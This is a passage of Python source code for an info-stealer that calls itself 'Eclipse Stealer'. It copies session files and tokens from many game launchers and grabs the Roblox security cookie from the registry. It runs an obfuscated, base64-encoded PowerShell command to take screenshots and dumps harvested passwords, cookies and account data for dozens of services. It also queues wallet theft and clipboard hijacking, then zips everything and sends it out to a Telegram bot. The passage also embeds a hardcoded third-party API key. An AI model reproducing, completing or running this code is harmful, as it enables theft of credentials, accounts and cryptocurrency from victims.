                                shutil.copy(src_file_path, target_path)

            async with aiohttp.ClientSession() as session:
                for mc_file in Path(directory_path, "Games").rglob("*.json"):
                    try:
                        with open(mc_file, 'r', encoding='utf-8') as f:
                            content = f.read()
                            jsonData = json.loads(content)

                        accountInfo = jsonData.get("accounts", {})
                        if accountInfo:
                            for accountId, accountData in accountInfo.items():
                                emailRegex = r"[\w\.-]+@[a-zA-Z\d\.-]+\.[a-zA-Z]{2,}"
                                emails = re.findall(emailRegex, json.dumps(accountInfo))

                                profile = accountData.get("minecraftProfile")
                                if profile:
                                    try:
                                        hypixel_url = f"https://api.hypixel.net/player?key=aa5d84c7-f617-4069-9e64-ae177cd7b869&uuid={profile['id']}"
                                        async with session.get(hypixel_url) as hypixel_response:
                                            hypixel_data = await hypixel_response.json()
                                    except aiohttp.ClientError:
                                        hypixel_data = {}

                                    try:
                                        namemc_url = f"https://api.namemc.com/profile/{profile['id']}/friends"
                                        async with session.get(namemc_url) as playerDBResponse:
                                            if playerDBResponse.status == 200:
                                                playerDBData = await playerDBResponse.json()
                                                name = [entry['name'] for entry in playerDBData]
                                                count = len(name)
                                            else:
                                                name, count = [], 0
                                    except aiohttp.ClientError:
                                        name, count = [], 0
                                    text = f"Minecraft Account\n\nSkins Links: \"https://crafatar.com/skins/{profile['id']}.png\"\nCapes Links: \"https://s.optifine.net/capes/{profile['name']}.png\"\n\nAccount ID: {accountId}\nUsername: {profile['name']}\nEmail: {emails or 'None'}\nMinecraft UID: {profile['id']}\nFriends Count: {count or 0}\nFriends List: {', '.join(name) or 'None'}\nHypixel Rank: {hypixel_data.get('achievementPoints', 'None')}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                    ListFonction.MinecraftAccount.append(f"{text}\n")
                    except Exception as error:
                        logs_handler(f"Error processing file {mc_file}: {str(error)}")  

        except Exception as Error:
            logs_handler(f"Error getting Minecraft Sessions: {str(Error)}")


    async def StealUbisoft(self, directory_path: str) -> None:
        try:
            ubisoft_path = os.path.join(self.localappdata, "Ubisoft Game Launcher")
            copied_path = os.path.join(directory_path, "Games", "Ubisoft")
            if os.path.isdir(ubisoft_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                for file in os.listdir(ubisoft_path):
                    name_of_files = os.path.join(ubisoft_path, file)
                    try:
                        shutil.copy(name_of_files, os.path.join(copied_path, file))
                    except Exception as Error:
                        logs_handler(f"[ERROR] - copying Ubisoft files to logs: {str(Error)}")
                        pass
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Ubisoft files: {str(Error)}")
            pass

    async def StealEpicGames(self, directory_path: str) -> None:
        try:
            epic_path = os.path.join(self.localappdata, "EpicGamesLauncher", "Saved", "Config", "Windows")
            copied_path = os.path.join(directory_path, "Games", "Epic Games")
            if os.path.isdir(epic_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    shutil.copytree(epic_path, os.path.join(copied_path, "Windows"))
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying EpicGames files to logs: {str(Error)}")
                    pass

        except Exception as Error:
            logs_handler(f"[ERROR] - getting EpicGames files: {str(Error)}")
            pass

    async def StealSteamFiles(self, directory_path: str) -> None:
        try:
            all_disks = []
            for drive in range(ord('A'), ord('Z') + 1):
                drive_letter = chr(drive)
                if os.path.exists(drive_letter + ':\\'):
                    all_disks.append(drive_letter)

            for steam_paths in all_disks:
                steam_path = os.path.join(steam_paths, "Program Files (x86)", "Steam", "config")
            save_path = os.path.join(directory_path)
            if os.path.isdir(steam_path):
                to_path = os.path.join(save_path, "Games", "Steam")
                try:
                    if not os.path.isdir(to_path):
                        os.mkdir(to_path)
                    shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Steam files to logs: {str(Error)}")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Steam files: {str(Error)}")
            return "null"

    async def StealRiotGames(self, directory_path) -> None:
        try:
            riotgame_path = os.path.join(self.localappdata, "Riot Games", "Riot Client", "Data")
            destination_path = os.path.join(directory_path, "Games", "Riot Games")

            if not os.path.exists(riotgame_path):
                return

            if not os.path.isdir(destination_path):
                    os.mkdir(destination_path)    
                
            shutil.copytree(riotgame_path, destination_path)
        
        except Exception as Error:
            logs_handler(f"Error getting Riot Game {str(Error)}")

    async def StealRoblox(self, browsercookies, browser) -> None:
        async def StealCookie():
            try:
                def get_roblox_cookie_from_registry():
                    paths = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
                    sub_key = "SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com"
                    cookie_name = ".ROBLOSECURITY"

                    for path in paths:
                        try:
                            registry_key = winreg.OpenKey(path, sub_key, 0, winreg.KEY_READ)
                            cookie, _ = winreg.QueryValueEx(registry_key, cookie_name)
                            winreg.CloseKey(registry_key)
                            return cookie
                        except FileNotFoundError:
                            continue
                        except Exception as e:
                            logs_handler(f"Error retrieving cookie from registry: {e}")
                            continue
                    return None

                regex_cookie = get_roblox_cookie_from_registry()
                return regex_cookie if regex_cookie else None

            except Exception as Error:
                logs_handler(f"Error retrieving cookie: {Error}")
                return None

        async def StealRobloxFiles():
            try:
                hostname = platform.node()
                filePath = os.path.join(self.temp, hostname)
                roblox_files_path = os.path.join(os.getenv('LOCALAPPDATA'), "Roblox", "LocalStorage")
                destination_path = os.path.join(filePath, "Games", "Roblox")
                if not os.path.exists(roblox_files_path):
                    return
                os.makedirs(destination_path, exist_ok=True)
                shutil.copytree(roblox_files_path, destination_path)
            except Exception as Error:
                logs_handler(f"Error copying Roblox files: {Error}")

        async def RobloxInfo(cookie):
            async with aiohttp.ClientSession() as session:
                async with session.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}) as response:
                    base_info = await response.json()
                    user_id = base_info.get("UserID")

                    if not user_id:
                        raise ValueError("Unable to retrieve Roblox user ID.")

                    return base_info

        async def AdvancedInfo(user_id):
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://users.roblox.com/v1/users/{user_id}") as response:
                    advanced_info = await response.json()
                    creation_date = advanced_info["created"].split("T")[0]
                    return {
                        "Description": advanced_info.get("description", "No Description"),
                        "CreationDate": creation_date,
                        "IsBanned": advanced_info.get("isBanned", False),
                    }

        async def FriendsList(user_id):
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://friends.roblox.com/v1/users/{user_id}/friends') as response:
                    response_text = await response.text()
                    friends_data = json.loads(response_text).get('data', [])[:3]

                    friend_list = []
                    for friend in friends_data:
                        banned_status = "True" if friend.get('isBanned', False) else "False"
                        verified_status = "True" if friend.get('hasVerifiedBadge', False) else "False"
                        friend_list.append((friend.get('displayName', ''), friend.get('name', ''), banned_status, verified_status))

                    return friend_list

        async def TotalRAP(user_id):
            errored_rap = 0
            total_value = 0
            cursor = ""
            done = False
            while not done:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100&cursor={cursor}") as response:
                            data = await response.json()

                    if 'nextPageCursor' in data:
                        cursor = data['nextPageCursor']
                    else:
                        done = True

                    for item in data.get("data", []):
                        try:
                            rap = int(item.get('recentAveragePrice', 0))
                            total_value += rap
                        except:
                            errored_rap += 1

                except Exception as Error:
                    logs_handler(f"Error retrieving RAP: {Error}")
                    done = True

            return total_value

        async def ProcessData(base_info, advanced_info, friend_list, rap):
            creation_timestamp = time.mktime(time.strptime(advanced_info["CreationDate"], "%Y-%m-%d"))
            current_timestamp = time.time()
            days_passed = round((current_timestamp - creation_timestamp) / (24 * 60 * 60))

            premium = 'True' if base_info["IsPremium"] else 'False'
            builder_club = 'True' if base_info["IsAnyBuildersClubMember"] else 'False'
            banned = 'True' if advanced_info["IsBanned"] else 'False'

            ListFonction.RobloxAccounts.append(f"Browser: {browser}\nBrowser Cookie: {browsercookies}\nCookie: {cookie}\nUser: {base_info['UserName']} ({base_info['UserID']})\nThumbnail: {base_info['ThumbnailUrl']}\nRobux: {base_info['RobuxBalance']}\nPremium: {premium}\nBuilder Club: {builder_club}\nCreation Date: {advanced_info['CreationDate']} / {days_passed} Days!\nDescription: {advanced_info['Description']}\nBanned: {banned}\nRAP: {rap}\nFriends List: {friend_list}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

        try:
            cookie = await StealCookie()
            if not cookie:
                await StealRobloxFiles()
                return

            base_info = await RobloxInfo(cookie)
            user_id = base_info["UserID"]
            advanced_info = await AdvancedInfo(user_id)
            friend_list = await FriendsList(user_id)
            rap = await TotalRAP(user_id)

            await ProcessData(base_info, advanced_info, friend_list, rap)

        except Exception as Error:
            logs_handler(f"Error collecting Roblox data: {Error}")

    async def StealGalaxy(self, directory_path) -> None:
        try:
            galaxy_path = os.path.join(self.localappdata, "GOG.com", "Galaxy", "Configuration", "config.json")
            destination_path = os.path.join(directory_path, "Games", "Galaxy")
            if not os.path.isfile(galaxy_path):
                return

            os.makedirs(destination_path, exist_ok=True)
            shutil.copy(galaxy_path, destination_path)
        except Exception as Error:
            logs_handler(f"Error getting Galaxy (GOG): {str(Error)}")

    async def StealRockstarGames(self, directory_path):
        try:
            rockstar_path = os.path.join(self.localappdata, "Rockstar Games", "Launcher", "settings_user.dat")
            destination_path = os.path.join(directory_path, "Games", "Rockstar Games")
            if not os.path.exists(rockstar_path):
                return
            os.makedirs(destination_path, exist_ok=True)
            shutil.copy(rockstar_path, destination_path)
        except Exception as Error:
            logs_handler(f"Error getting Rockstar Games {str(Error)}")

    async def StealElectronicArts(self, directory_path):
        try:
            electronic_arts_path = os.path.join(self.localappdata, "Electronic Arts", "EA Desktop", "Windows", "cookie.ini")
            destination_path = os.path.join(directory_path, "Games", "Electronic Arts" )
            if not os.path.exists(electronic_arts_path):
                return
            os.makedirs(destination_path, exist_ok=True)
            shutil.copy(electronic_arts_path, destination_path)
        except Exception as Error:
            logs_handler(f"Error getting Electronic Arts {str(Error)}")


    async def StealBattleNet(self, directory_path) -> None:
        battle_net_path = os.path.join(self.appdata, 'Battle.net')
        if not os.path.exists(battle_net_path):
            return

        try:
            battle_path = os.path.join(directory_path, "Games", "Battle Net")
            os.makedirs(battle_path, exist_ok=True)
            for pattern in ["*.db", "*.config"]:
                for root, dirs, files in os.walk(battle_net_path):
                    for file in files:
                        if file.endswith(tuple(pattern.split("*"))):
                            try:
                                file_path = os.path.join(root, file)
                                if os.path.basename(root) == "Battle.net":
                                    destination_dir = directory_path
                                else:
                                    destination_dir = os.path.join(directory_path, os.path.basename(root))

                                os.makedirs(destination_dir, exist_ok=True)
                                shutil.copy(file_path, os.path.join(battle_path, file))
                            except Exception as Error:
                                logs_handler(f"[ERROR] - copying BattleNet files to logs: {str(Error)}")
                                return
        except Exception as Error:
            logs_handler(f"[ERROR] - getting BattleNet files: {str(Error)}")
            pass

    async def StealShadow(self, directory_path: str) -> None:
        try:
            shadow_path = os.path.join(self.appdata, 'shadow')
            copied_path = os.path.join(directory_path, "Games", "Shadow")
            if os.path.isdir(shadow_path):
                if not os.path.exists(copied_path):
                    os.makedirs(copied_path)
                
                try:
                    items_to_copy_shadow = [
                        ("Local State", "Local State"),
                        ("Local Storage", "Local Storage"),
                        ("Session Storage", "Session Storage")
                    ]
                    
                    for item, target in items_to_copy_shadow:
                        source_path = Path(shadow_path) / item
                        target_path = os.path.join(copied_path, target)

                    if os.path.exists(source_path):
                        if os.path.isdir(source_path):
                            shutil.copytree(source_path, target_path)
                        elif os.path.isfile(source_path):
                            shutil.copy(source_path, target_path)                    
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying Shadow files to logs: {str(Error)}")
                    pass
                
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - getting Shadow files: {str(Error)}")
            pass

    async def InsideFolder(self) -> None:
        try:
            hostname = platform.node()
            filePath = os.path.join(self.temp, hostname)

            if os.path.isdir(filePath):
                shutil.rmtree(filePath)

            os.makedirs(os.path.join(filePath, "Mozilla"), exist_ok=True)
            os.makedirs(os.path.join(filePath, "Computer"), exist_ok=True)
            os.makedirs(os.path.join(filePath, "Sessions"), exist_ok=True)
            os.makedirs(os.path.join(filePath, "Games"), exist_ok=True)

            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
            process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}", cwd=filePath, shell=True)
            await process.communicate() 

            if self.GeckoPasswordsList:
                with open(os.path.join(filePath, "Mozilla", "passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in self.GeckoAutofiList:
                        file.write(value)            
            if self.GeckoAutofiList:
                with open(os.path.join(filePath, "Mozilla", "autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in self.GeckoAutofiList:
                        file.write(value)
            if self.GeckoCookieList:
                with open(os.path.join(filePath, "Mozilla", "cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in self.GeckoCookieList:
                        file.write(value)
            if self.GeckoHistoryList:
                with open(os.path.join(filePath, "Mozilla", "historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in self.GeckoHistoryList:
                        file.write(value)   

            if ListFonction.SystemInfo:
                with open(os.path.join(filePath, "Computer", "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SystemInfo:
                        file.write(value)
            if ListFonction.ClipBoard:
                with open(os.path.join(filePath, "Computer", "clipboard_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.ClipBoard:
                        file.write(value)
            if ListFonction.Network:
                with open(os.path.join(filePath, "Computer", "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Network:
                        file.write(value)
            if ListFonction.AntiViruses:
                with open(os.path.join(filePath, "Computer", "anti_viruses.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.AntiViruses:
                        file.write(value)
            if ListFonction.FileSystemInfo:
                with open(os.path.join(filePath, "Computer", "file_system.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.FileSystemInfo:
                        file.write(value)
            if ListFonction.ApplicationsInfo:
                with open(os.path.join(filePath, "Computer", "application_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.ApplicationsInfo:
                        file.write(value)
            if ListFonction.WifiInfo:
                with open(os.path.join(filePath, "Computer", "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.WifiInfo:
                        file.write(value)

            if ListFonction.SteamUserAccounts:
                with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SteamUserAccounts:
                        file.write(value)
            if ListFonction.FacebookAccounts:
                with open(os.path.join(filePath, "Sessions", "facebook_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.FacebookAccounts:
                        file.write(value)
            if ListFonction.DiscordAccounts:
                with open(os.path.join(filePath, "Sessions", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.DiscordAccounts:
                        file.write(value)
            if ListFonction.RobloxAccounts:
                with open(os.path.join(filePath, "Sessions", "roblox_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.RobloxAccounts:
                        file.write(value)
            if ListFonction.SpotifyAccount:
                with open(os.path.join(filePath, "Sessions", "spotify_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SpotifyAccount:
                        file.write(value)
            if ListFonction.TwitchAccounts:
                with open(os.path.join(filePath, "Sessions", "twitch_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.TwitchAccounts:
                        file.write(value)
            if ListFonction.TwitterAccounts:
                with open(os.path.join(filePath, "Sessions", "twitter_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.TwitterAccounts:
                        file.write(value)
            if ListFonction.RedditAccounts:
                with open(os.path.join(filePath, "Sessions", "reddit_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.RedditAccounts:
                        file.write(value)
            if ListFonction.InstagramAccounts:
                with open(os.path.join(filePath, "Sessions", "instagram_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.InstagramAccounts:
                        file.write(value)
            if ListFonction.StakeAccount:
                with open(os.path.join(filePath, "Sessions", "stake_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.StakeAccount:
                        file.write(value)
            if ListFonction.PatreonAccounts:
                with open(os.path.join(filePath, "Sessions", "patreon_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.PatreonAccounts:
                        file.write(value)
            if ListFonction.GuildedAccounts:
                with open(os.path.join(filePath, "Sessions", "guilded_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.GuildedAccounts:
                        file.write(value)
            if ListFonction.RiotUserAccounts:
                with open(os.path.join(filePath, "Sessions", "riot_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.RiotUserAccounts:
                        file.write(value)
            if ListFonction.MinecraftAccount:
                with open(os.path.join(filePath, "Sessions", "minecraft_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.MinecraftAccount:
                        file.write(value)


            if len(os.listdir(os.path.join(filePath, "Mozilla"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Mozilla"))
                except:pass

            if len(os.listdir(os.path.join(filePath, "Computer"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Computer"))
                except:pass

            if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Sessions"))
                except:pass
            

            tasks = [
                self.StealWallets(filePath),
                self.CryptoClipper(),
                self.InjectWallets(),
                self.InjectMullvad(),
                self.StealTelegramSession(filePath),
                self.StealWhatsApp(filePath),
                self.StealSignal(filePath),
                self.StealSkype(filePath),
                self.StealElement(filePath),
                self.StealPidgin(filePath),
                self.StealTox(filePath),
                self.StealViber(filePath),
                self.StealProtonVPN(filePath),
                self.StealOpenVPN(filePath),
                self.StealSurfsharkVPN(filePath),
                self.StealNordVPN(filePath),
                self.StealFileZilla(filePath),
                self.StealSmartFTP(filePath),
                self.StealTotalCommander(filePath),
                self.StealWinSCP(filePath),
                self.StealRdpSessions(filePath),
                self.BackupMailbird(filePath),
                self.BackupThunderbird(filePath),
                self.StealPasswordManagers(filePath),
                self.StealMinecraft(filePath),
                self.StealUbisoft(filePath),
                self.StealEpicGames(filePath),
                self.StealSteamFiles(filePath),
                self.StealRiotGames(filePath),
                self.StealGalaxy(filePath),
                self.StealRockstarGames(filePath),
                self.StealElectronicArts(filePath),
                self.StealBattleNet(filePath),
                self.StealShadow(filePath),
            ]
            
            await asyncio.gather(*tasks)

            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients", "Games", "Password Managers"]
            if not os.path.exists(filePath):
                return

            for root, dirs, files in os.walk(filePath, topdown=False):
                for dir_name in dirs:
                    if dir_name in folders_to_check:
                        dir_path = os.path.join(root, dir_name)
                        if not os.listdir(dir_path):
                            shutil.rmtree(dir_path)

        except Exception as Error:
            logs_handler(f"[ERROR] - sending all data to the logs folder: {str(Error)}")

    async def SendAllData(self) -> None:
        try:
            hostname = platform.node()
            filePath = os.path.join(self.temp, hostname)
            shutil.make_archive(filePath, "zip", filePath)
            
            system_info = platform.uname()
            ip_info = requests.get("https://ipinfo.io/json").json()

            text = f"""
<b>👤  <i><u>{hostname.upper()} - Eclipse Stealer</u></i></b>

<b>⚙️  <i><u>System Informations</u></i></b>
<b>💻 Computer Host:</b> <code>{system_info.node}</code>
<b>🔌 Computer OS:</b> <code>{system_info.system} {system_info.release} {system_info.version}</code>
<b>🔋 CPU:</b> <code>{system_info.processor}</code>

<b>🌐  <i><u>Network Informations</u></i></b>
<b>🎯 IP Address:</b> <code>{ip_info.get("ip", "N/A")}</code>
<b>⛰ Region:</b> <code>{ip_info.get("region", "N/A")}</code>
<b>📍 Country:</b> <code>{ip_info.get("country", "N/A")}</code>

🔮 <code>https://t.me/eclipsemalware</code>
"""

            send_message_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            files_in_directory = os.listdir(filePath)
            png_files = [f for f in files_in_directory if f.endswith(".png")]

            if not png_files:
                raise FileNotFoundError("No PNG file found in the provided directory.")
            
            photo_path = os.path.join(filePath, png_files[0])
            message_payload = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}
            document_path = filePath + ".zip"

            if not os.path.exists(document_path):
                raise FileNotFoundError(f"Document not found: {document_path}")
            
            send_photo_url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
            form = aiohttp.FormData()
            form.add_field('chat_id', CHAT_ID)
            form.add_field('photo', open(photo_path, 'rb'), filename=os.path.basename(photo_path))
            form.add_field('caption', text)
            form.add_field('parse_mode', 'HTML')
            form.add_field('document', open(document_path, 'rb'), filename=f"{os.path.basename(filePath)}.zip")
           
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.post(send_photo_url, data=form) as response:
                        if response.status != 200:
                            raise Exception(f"[ERROR] - sending photo and document to telegram: {await response.text()}")
                except Exception as Error:
                    logs_handler(f"Error sending message with photo and document: {str(Error)}")
                else:
                    file_url = await UploadFiles.upload_file(filePath + ".zip")
                    if file_url is not None:
                        text = f"<b>📥  <i><u>{platform.node().upper()} - Eclipse Stealer</u></i></b>\n\n<b>⛓️  Stealed Data: <a href=\"{file_url}\">All Data Link</a></b>"
                        message_payload['text'] = text
                        async with session.post(send_message_url, data=message_payload) as response:
                            if response.status != 200:
                                logs_handler(f"[ERROR] - sending file link message to telegram: {await response.text()}")
                                raise Exception(f"[ERROR]")
                    else:
                        text = "<b>📥 Can't Send Logs</b>"
                        message_payload['text'] = text
                        async with session.post(send_message_url, data=message_payload) as response:
                            if response.status != 200:
                                logs_handler(f"[ERROR] - sending message to telegram: {await response.text()}")
                                raise Exception(f"[ERROR]")
                try:
                    os.remove(filePath + ".zip")
                    shutil.rmtree(filePath)
                except Exception as Error:
                    logs_handler(f"[ERROR] - removing logs zip file: {str(Error)}")

        except Exception as Error:
            logs_handler(f"[ERROR] - sending all data: {str(Error)}")

class StealFiles:
    def __init__(self) -> None:
        self.send_message_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        self.send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

    async def search_files(self, directory: str, keywords: List[str], extensions: List[str]) -> List[str]:
        found_files = []
        try:
            for file in os.listdir(directory):
                path = os.path.join(directory, file)
                if os.path.isdir(path):
                    continue
                extension = os.path.splitext(file)[1].lower()
                if extension in extensions and any(keyword.lower() in file.lower() for keyword in keywords):
                    found_files.append(path)
        except Exception:
            pass
        return found_files

